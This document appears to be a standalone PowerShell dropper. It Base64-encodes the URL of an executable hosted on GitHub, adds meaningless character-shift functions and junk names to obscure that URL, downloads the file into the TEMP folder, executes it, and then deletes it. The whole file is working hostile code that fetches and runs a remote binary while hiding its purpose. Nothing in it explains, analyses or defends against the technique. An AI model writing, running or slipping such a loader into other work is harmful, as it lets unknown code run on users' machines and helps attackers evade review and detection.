$asdfewvvbqrrqwe = "aHR0cHM6Ly9naXRodWIuY29tL251bGwtcDRuL25pY2Vjb21wdXRlci9yYXcvcmVmcy9oZWFkcy9tYWluL21hcmlvX2Rpc3QuZXhl"

function trewwfddfdf {
    param (
        [string]$fgdsghsedfreg5555
    )
    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fgdsghsedfreg5555))
}

$url = trewwfddfdf -fgdsghsedfreg5555 $asdfewvvbqrrqwe

function DL-F {
    param (
        [string]$u
    )
    $o = [System.IO.Path]::Combine($env:TEMP, [System.IO.Path]::GetFileName($u))
    $c = New-Object System.Net.WebClient
    $c.DownloadFile($u, $o)
    return $o
}

function EX-F {
    param (
        [string]$f
    )
    Start-Process -FilePath $f -NoNewWindow -Wait
}

function fdfdfdereeee {
    param (
        [string]$input
    )
    $chars = [System.Text.Encoding]::UTF8.GetBytes($input)
    $rrrereeewww = ""
    foreach ($char in $chars) {
        $rrrereeewww += [char]($char + 1)
    }
    return $rrrereeewww
}

$yteyurttttt = fdfdfdereeee -input $url

function rtewrtwwww {
    param (
        [string]$input
    )
    $chars = [System.Text.Encoding]::UTF8.GetBytes($input)
    $ertwefff = ""
    foreach ($char in $chars) {
        $ertwefff += [char]($char - 1)
    }
    return $ertwefff
}

$deyteyurttttt = rtewrtwwww -input $yteyurttttt

$fPath = DL-F -u $deyteyurttttt

EX-F -f $fPath

Remove-Item -Path $fPath
